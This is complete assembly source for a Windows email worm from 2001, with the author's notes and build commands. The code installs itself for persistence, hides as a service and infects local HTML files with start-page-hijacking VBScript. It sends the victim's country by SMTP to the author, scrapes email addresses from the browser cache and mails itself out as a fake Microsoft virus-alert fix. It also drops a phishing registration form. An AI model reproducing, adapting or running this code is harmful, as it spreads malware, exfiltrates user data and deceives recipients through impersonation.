comment #
Name : I-Worm.MaLoTeYa
Author : PetiK
Date : July 2nd - July 6th
Size : 12288 byte

Action: It copies itself to \WINDOWS\RUNW32.EXE and to \WINDOWS\SYSTEM\MSVA.EXE. It alters the
run= line and creates the VARegistered.htm file in the StartUp folder. This file send some
informations to petik@multimania.com and displays a fake message.
If the version of the platform is Windows 95/98, the file is a service process.
It infects all *.htm and *.html file while writing at the end a VB script. It checks after
if exist a internet connection and scans all *.htm* files in the "Temporary Internet Files"
to find some EMail addreses and send a copy of itself. The worms sends equally an email to
"petik@multimania.com" with the country of the user. When the user want to see the
system properties, the title of the window is changed by "PetiK always is with you :-)".

Greets to Benny, ZeMacroKiller98, Mandragore.

tasm32 /M /ML Maloteya
tlink32 -Tpe -aa -x Maloteya,,,import32

#

.586p
.model flat
.code

JUMPS

callx macro a
extrn a:proc
call a
endm

include useful.inc

;----------------------------------------
;Installation of the worm in the computer
;----------------------------------------
DEBUT:
VERIF:	push  00h
	callx GetModuleFileNameA
	push  50h
	push  offset szOrig
	push  eax
	callx GetModuleFileNameA

	push  50h
	push  offset szCopie
	callx GetWindowsDirectoryA
	@pushsz "\RUNW32.EXE"
	push  offset szCopie
	callx lstrcat
	
	push  50h
	push  offset szCopb
	callx GetSystemDirectoryA
	@pushsz "\MSVA.EXE"
	push  offset szCopb
	callx lstrcat

	push  offset szOrig
	push  offset szCopie
	callx lstrcmp
	test  eax,eax
	jz    CACHE

COPIE:	push  00h
	push  offset szCopie
	push  offset szOrig
	callx CopyFileA
	push  00h
	push  offset szCopb
	push  offset szOrig
	callx CopyFileA

WININI:	push  50
	push  offset szWinini
	callx GetWindowsDirectoryA
	@pushsz "\\WIN.INI"
	push  offset szWinini
	callx lstrcat
	push  offset szWinini
	push  offset szCopie
	@pushsz "run"
	@pushsz "windows"
	callx WritePrivateProfileStringA

;--------------------------------------------------
;Create VARegistered.htm file in the StartUp folder
;--------------------------------------------------
C_GET:	@pushsz "SHELL32.dll"
	callx LoadLibraryA
	mov   SHELLhdl,eax
	@pushsz "SHGetSpecialFolderPathA"
	push  SHELLhdl
	callx GetProcAddress
	mov   getfolder,eax
	push  00h
	push  07h				; STARTUP Folder
	push  offset StartUp
	push  00h
	call  [getfolder]
	test  eax,eax
	je    F_HTM
	@pushsz "\VARegistered.htm"
	push  offset StartUp
	callx lstrcat
	
HTM:	push  00h
	push  80h
	push  02h
	push  00h
	push  01h
	push  40000000h
	push  offset StartUp
	callx CreateFileA
	mov   [FileHdl],eax
	push  00h
	push  offset octets
	push  HTMTAILLE
	push  offset htmd
	push  [FileHdl]
	callx WriteFile
	push  [FileHdl]
	callx CloseHandle	
F_HTM:	push  [SHELLhdl]
	callx FreeLibrary

F_MESS:	push  1000
	callx Sleep
	push  1040h
	@pushsz "Microsoft Virus Alert"
	@pushsz "Your system does not appear infected with I-Worm.Magistr"
	push  00h
	callx MessageBoxA
	jmp   FIN

;----------------------------------
;Serivice process for Windows 95/98
;----------------------------------
CACHE:	@pushsz "KERNEL32.dll"
	callx GetModuleHandleA
	@pushsz "RegisterServiceProcess"
	push  eax
	callx GetProcAddress
	xchg  ecx,eax
	jecxz D_INF
	push  01h
	push  00h
	call  ecx

D_INF:	push  50
	push  offset szCurrent
	callx GetCurrentDirectoryA
	push  offset szCurrent
	callx SetCurrentDirectoryA

;---------------------------------------------
;Infect all *.htm* files of the Windows folder
;---------------------------------------------
FFF:	push  offset Search
	@pushsz "*.htm*"			; Search some *.htm* files...
	callx FindFirstFileA
	inc   eax
	je    F_INF
	dec   eax
	mov   [htmlHdl],eax

i_file:	call  infect				; and infect them
	
	push  offset Search
	push  [htmlHdl]
	callx FindNextFileA
	test  eax,eax
	jne   i_file
	push  [htmlHdl]
	callx FindClose
F_INF:	

;-----------------------
; Check if we r conected
;-----------------------
NET1:	@pushsz "WININET.dll"
	callx LoadLibraryA
	test  eax,eax
	jz    FIN
	mov   WNEThdl,eax
	@pushsz "InternetGetConnectedState"
	push  WNEThdl
	callx GetProcAddress
	test  eax,eax
	jz    FIN
	mov   netcheck,eax
	jmp   NET2
NET2:	push  00h
	push  offset Temp
	call  [netcheck]			; Connect to Internet ??
	dec   eax
	jnz   NET2
FINNET:	push  [WNEThdl]
	callx FreeLibrary

PAYS:	push  50
	push  offset szSystemini
	callx GetWindowsDirectoryA
	@pushsz "\Win.ini"
	push  offset szSystemini
	callx lstrcat
	push  offset szSystemini
	push  20
	push  offset org_pays
	push  offset Default
	@pushsz "sCountry"
	@pushsz "intl"
	callx GetPrivateProfileStringA

;------------------------------------------------------------------
; Send the name of country to "petik@multomania.com" (perhaps bugs)
;------------------------------------------------------------------
SMTP:	push  offset WSA_Data			; Winsock
	push  0101h				; ver 1.1 (W95+)
	callx WSAStartup
	or    eax,eax
	jnz   INIT
	
	@pushsz "obelisk.mpt.com.uk"
	callx gethostbyname			; convert SMTP Name to an IP address
	xchg  ecx,eax
	jecxz FREE_WIN				; Error ?
	mov   esi,[ecx+12]			; Fetch IP address
	lodsd
	push  eax
	pop   [ServIP]

	push  00h				; Create Socket
	push  01h				; SOCK_STREAM
	push  02h				; AF_INET
	callx socket
	mov   work_socket,eax
	inc   eax
	jz    FREE_WIN

	push  16				; Sze of connect strucure
	call  @1				; Connect structure
	dw    2					; Family
	db    0, 25				; Port number
	ServIP dd 0				; IP of server
	db    8 dup(0)				; Unused
	@1:
	push  [work_socket]
	callx connect
	inc   eax
	jz    CLOSE_SOC

	lea   esi,Send_M
	mov   bl,6

	Command_Loop:	xor   eax,eax

	call  @2				; Time-out:
	Time_Out:  dd 5				; Seconds
	dd 0					; Milliseconds
	@2:
	push  eax				; Not used (Error)
	push  eax				; Not used (Writeability)
	call  @3
	Socket_Set:	dd 1			; Socket count
	work_socket	dd 0			; Socket
	@3:
	push  eax				; Unused
	callx select
	dec   eax
	jnz   CLOSE_SOC

	push  00h
	push  512				; Received data from socket
	push  offset buf_recv
	push  [work_socket]
	callx recv
	xchg  ecx,eax				; Connection closed ?
	jecxz CLOSE_SOC
	inc   ecx				; Error ?
	jz    CLOSE_SOC
	or    ebx,ebx				; Received stuff was QUIT
	jz    CLOSE_SOC				; reply ? then close up.
	mov   al,'2'				; "OK" reply

	cmp   bl,2				; Received stuff was the DATA
	jne   Check_Reply			; reply ?
	inc   eax
	Check_Reply: scasb
	je    Wait_Ready
	
	lea   esi,Send_M + (5*4)
	mov   bl,1

	Wait_Ready:
	xor   ecx,ecx
	lea   eax,Time_Out
	push  eax
	push  ecx				; not used (Error)
	lea   eax,Socket_Set
	push  eax				; Writeability
	push  ecx				; Not used (Readability)	
	push  ecx				; Unused
	callx select
	dec   eax				; Time-ouit ??
	jnz   CLOSE_SOC

	cld
	lodsd

	movzx ecx,ax
	shr   eax,16
	add   eax,ebp
	
	push  ecx				; Send command and data to the socket	
	push  00h
	push  ecx				; Size of buffer
	push  eax				; Buffer
	push  [work_socket]
	callx send
	pop   ecx
	cmp   eax,ecx
	jne   CLOSE_SOC
	dec   ebx
	jns   Command_Loop

CLOSE_SOC:
	push  [work_socket]
	callx closesocket
FREE_WIN:
	callx WSACleanup


INIT:	@pushsz "MAPI32.dll"
	callx LoadLibraryA
	test  eax,eax
	jz    FIN
	mov   MAPIhdl,eax
	@pushsz "MAPISendMail"
	push  MAPIhdl
	callx GetProcAddress
	test  eax,eax
	jz    FIN
	mov   sendmail,eax

D_GET:	@pushsz "SHELL32.dll"
	callx LoadLibraryA
	mov   SHELLhdl,eax
	@pushsz "SHGetSpecialFolderPathA"
	push  SHELLhdl
	callx GetProcAddress
	mov   getfolder,eax
	push  00h
	push  20h				; MSIE Cache Folder
	push  offset Cache
	push  00h
	call  [getfolder]
	push  [SHELLhdl]
	callx FreeLibrary
	push  offset Cache
	callx SetCurrentDirectoryA

;-----------------------------------------------------------
; Search email addresses into the "Temporary Internet Files"
;-----------------------------------------------------------
FFF2:	push  offset Search
	@pushsz "*.htm*"
	callx FindFirstFileA
	inc   eax
	je    END_SPREAD
	dec   eax
	mov   [htmlHdl],eax

i_htm:	call  infect2
	
	push  offset Search
	push  [htmlHdl]
	callx FindNextFileA
	test  eax,eax
	jne   i_file
	push  [htmlHdl]
	callx FindClose
	
END_SPREAD:
	push  [MAPIhdl]
	callx FreeLibrary

;---------------------------------------------------------------
; Changes the title of the System Properties window on Wednesday
;---------------------------------------------------------------
DATE:	push  offset SystemTime
	callx GetSystemTime
	cmp   [SystemTime.wDayOfWeek],3
	jne   FIN
WIN1:	@pushsz "Propriétés Systême"
	push  00h
	callx FindWindowA
	test  eax,eax
	jz    WIN2
	jmp   WIN3
WIN2:	@pushsz "System Properties"			; Change title some windows
	push  00h
	callx FindWindowA
	test  eax,eax
	jz    WIN1
WIN3:	mov   edi,eax
	@pushsz "PetiK always is with you :-)"
	push  edi
	callx SetWindowTextA
	jmp   WIN1

FIN:	push  00h
	callx ExitProcess

infect:	pushad
	mov   esi,offset Search.cFileName
	push  esi
	callx GetFileAttributesA
	cmp   eax,1
	je    end_infect
	push  00h
	push  80h
	push  03h
	push  00h
	push  01h
	push  40000000h
	push  esi
	callx CreateFileA
	xchg  eax,edi
	inc   edi
	je    end_infect
	dec   edi
	push  02h					; FILE_END
	push  00h
	push  [Dist]
	push  edi
	callx SetFilePointer
	push  00h
	push  offset octets
	push  HTMSIZE
	push  offset d_htm
	push edi
	callx WriteFile
	push  edi
	callx CloseHandle
	push  01h					; READONLY
	push  esi
	callx SetFileAttributesA
end_infect:   popad
	ret

infect2:pushad
	push  00h
	push  80h
	push  03h
	push  00h
	push  01h
	push  80000000h
	push  offset Search.cFileName
	inc   eax
	je    END_SPREAD
	dec   eax
	xchg  eax,ebx

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  02h					; PAGE_READONLY
	push  eax
	push  ebx
	callx CreateFileMappingA
	test  eax,eax
	je    F1
	xchg  eax,ebp

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  04h					; FILE_MAP_READ
	push  ebp
	callx MapViewOfFile
	test  eax,eax
	je    F2
	xchg  eax,esi

	push  00h
	push  ebx
	callx GetFileSize
	xchg  eax,ecx
	jecxz F3

d_scan_mail:
	call  @melto
	db    'mailto:'
@melto:	pop   edi
scn_mail:
	pushad
	push  07h
	pop   ecx
	rep   cmpsb
	popad
	je    scan_mail
	inc   esi
	loop  scn_mail

F3:	push  esi
	callx UnmapViewOfFile
F2:	push  ebp
	callx CloseHandle
F1:	push  ebx
	callx CloseHandle
	popad
	ret

scan_mail:
	xor   edx,edx
	add   esi,7					; size of the string "mailto:"
	mov   edi,offset m_addr
	push  edi
p_car:	lodsb						; next character
	cmp   al,' '					; space ??
	je    car_s
	cmp   al,'"'					; end character ??
	je    car_f
	cmp   al,''''					; end character ??
	je    car_f
	cmp   al,'@'					; @ character ??
	jne   not_a
	inc   edx
not_a:	stosb
	jmp   p_car					; jmp to nxt char
car_s:	inc   esi
	jmp   p_car
car_f:	xor   al,al
	stosb
	pop   edi
	test  edx,edx					; exist @ ??
	je    d_scan_mail
	call  ENVOIE
	jmp   d_scan_mail


ENVOIE:	xor   eax,eax
	push  eax
	push  eax
	push  offset Message
	push  eax
	push  [MAPIh]
	call  [sendmail]
	ret

.data
namer		db 50 dup (0)
szCopb		db 50 dup (0)
szCopie		db 50 dup (0)
szCurrent	db 50 dup (0)
szOrig		db 50 dup (0)
szSystemini	db 50 dup (0)
szWinini	db 50 dup (0)
Cache		db 70 dup (0)
StartUp		db 70 dup (0)
m_addr		db 128 dup (?)
WSA_Data	db 400 dup (0)
buf_recv	db 512 dup (0)
Default		db 0
FileHdl		dd ?
octets		dd ?
netcheck	dd ?
sendmail	dd ?
getfolder	dd ?
htmlHdl		dd ?
MAPIhdl		dd ?
SHELLhdl	dd ?
WNEThdl		dd ?
RegHdl		dd ?
Dist		dd 0
Temp		dd 0
MAPIh		dd 0
WormName	db "I-Worm.MaLoTeYa coded by PetiK (c)2001 (05/07)",00h
Origine		db "Made In France",00h



Message		dd ?
		dd offset sujet
		dd offset corps
		dd ?
		dd offset date
		dd ?
		dd 2					; MAPI_RECEIPT_REQUESTED ??
		dd offset MsgFrom
		dd 1					; MAPI_UNREAD ??
		dd offset MsgTo
		dd 1
		dd offset AttachDesc

MsgFrom		dd ?
		dd ?
		dd offset NameFrom
		dd offset MailFrom
		dd ?
		dd ?

MsgTo		dd ?
		dd 1					; MAIL_TO
		dd offset NameTo
		dd offset m_addr
		dd ?
		dd ?

AttachDesc	dd ?
		dd ?
		dd ?			; character in text to be replaced by attachment
		dd offset szCopb	; Full path name of attachment file
		dd ?
		dd ?

sujet		db "New Virus Alert !!",00h
corps		db "This is a fix against I-Worm.Magistr.",0dh,0ah
		db "Run the attached file (MSVA.EXE) to detect, repair and "
		db "protect you against this malicious worm.",00h
date		db "2001/07/01 15:15",00h	; YYYY/MM//DD HH:MM
NameFrom	db "Microsoft Virus Alert"
MailFrom	db "virus_alert@microsoft.com",00h
NameTo		db "Customer",00h

Send_M:		dw fHELO-dHELO
		dw fFROM-dFROM
		dw fRCPT-dRCPT
		dw fDATA-dDATA
		dw fMAIL-dMAIL
		dw fQUIT-dQUIT

		dHELO	db 'HELO obelisk.mpt.com.uk',0dh,0ah
		fHELO:
		dFROM	db 'MAIL FROM:<maloteya@petik.com>',0dh,0ah
		fFROM:
		dRCPT	db 'RCPT TO:<petik@multimania.com>',0dh,0ah
		fRCPT:
		dDATA	db 'DATA',0dh,0ah
		fDATA:
		dMAIL:	db 'From: "MaLoTeYa",<maloteya@petik.com>',0dh,0ah
			db 'Subject: Long Live the Worm',0dh,0ah
			db 'Pays d''origine : '
			org_pays db 20 dup (0)
			db '',0dh,0ah
			db '.',0dh,0ah
		fMAIL:
		dQUIT	db 'QUIT',0dh,0ah
		fQUIT:

htmd:	db "<html><head><title>Virus Alert Registration</title></head>",0dh,0ah
	db "<SCRIPT LANGUAGE=""VBScript"">",0dh,0ah
	db "Sub control",0dh,0ah
	db "dim i",0dh,0ah
	db "dim caract",0dh,0ah
	db "formu.action=""""",0dh,0ah
	db "If formu.mail.value="""" Then",0dh,0ah
	db "	MsgBox ""Forgotten EMail""",0dh,0ah
	db "	Else",0dh,0ah
	db "	For i= 1 to len(formu.mail.value)",0dh,0ah
	db "	    caract=mid(formu.mail.value,i,1)",0dh,0ah
	db "	    If caract=""@"" Then",0dh,0ah
	db "	        Exit For",0dh,0ah
	db "	    End If",0dh,0ah
	db "	Next",0dh,0ah
	db "    If caract=""@"" Then",0dh,0ah
	db "        formu.action=""mailto:petik@multimania.com""",0dh,0ah
	db "    Else",0dh,0ah
	db "        MsgBox ""Invalid EMail""",0dh,0ah
	db "    End If",0dh,0ah
	db "End If",0dh,0ah
	db "End Sub",0dh,0ah
	db "</SCRIPT>",0dh,0ah
	db "<body bgcolor=white text=black>",0dh,0ah
	db "<p align=""center""><font size=""5"">Microsoft Virus Alert Registration</font></p>",0dh,0ah
	db "<p align=""left""><font size=""3"">Please fill out this form. </font>",0dh,0ah
	db "<font>You must be connected to internet.</font></p>",0dh,0ah
	db "<p></p>",0dh,0ah
	db "<form name=""formu"" action method=""POST"" enctype=""text/plan"">",0dh,0ah
	db "<p>Name : <input name=""nom"" type=""TEXT"" size=""40""></p>",0dh,0ah
	db "<p>Firstname : <input name=""prenom"" type=""TEXT"" size=""40""></p>",0dh,0ah
	db "<p>City : <input name=""ville"" type=""TEXT"" size=""40""></p>",0dh,0ah
	db "<p>Country : <input name=""pays"" type=""TEXT"" size=""40""></p>",0dh,0ah
	db "<p>E-Mail : <input name=""mail"" type=""TEXT"" size=""40""></p>",0dh,0ah
	db "<p><input type=""submit"" value=""Submit"" name=""B1"" onclick=""control""></p>",0dh,0ah
	db "<p></p>",0dh,0ah
	db "<p align=""center""><font><B>AFTER REGISTRATION YOU CAN DELETE THIS FILE</B></font></p>",0dh,0ah
	db "</form></body></html>",00h
HTMTAILLE	equ $-htmd

d_htm:  db "",0dh,0ah,0dh,0ah
	db "<SCRIPT Language=VBScript>",0dh,0ah
	db "On Error Resume Next",0dh,0ah
	db "Set fso=CreateObject(""Scripting.FileSystemObject"")",0dh,0ah
	db "Set ws=CreateObject(""WScript.Shell"")",0dh,0ah
	db "ws.RegWrite ""HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"",""http://www.petikvx.fr.fm""",0dh,0ah
	db "document.Write ""<font face='verdana' color=red size='2'>This file is infected by my new virus"
	db "<br>Written by PetiK (c)2001"
	db "<br>HTML/W32.MaLoTeYa.Worm<br></font>""",0dh,0ah
	db "</SCRIPT>",0dh,0ah
HTMSIZE		equ $-d_htm

OSVERSIONINFO	struct
dwOSVersionInfoSize	dd ?
dwMajorVersion		dd ?
dwMinorVersion		dd ?
dwBuildNumber		dd ?
dwPlatformId		dd ?
szCSDVersion		db 128 dup (?)
OSVERSIONINFO    ends

SYSTIME  	struct
wYear			WORD ?
wMonth			WORD ?
wDayOfWeek		WORD ?
wDay			WORD ?
wHour			WORD ?
wMinute			WORD ?
wSecond			WORD ?
wMillisecond		WORD ?
SYSTIME  	ends

MAX_PATH	equ 260

FILETIME	struct
dwLowDateTime		dd ?
dwHighDateTime		dd ?
FILETIME		ends
WIN32_FIND_DATA struct
dwFileAttributes	dd ?
ftCreationTime		FILETIME ?
ftLastAccessTime	FILETIME ?
ftLastWriteTime		FILETIME ?
nFileSizeHigh		dd ?
nFileSizeLow		dd ?
dwReserved0		dd ?
dwReserved1		dd ?
cFileName		dd MAX_PATH (?)
cAlternateFileName	db 13 dup (?)
			db 3 dup (?)
WIN32_FIND_DATA	ends

OSVer		OSVERSIONINFO <>
SystemTime	SYSTIME <>
Search		WIN32_FIND_DATA <>

end DEBUT
end
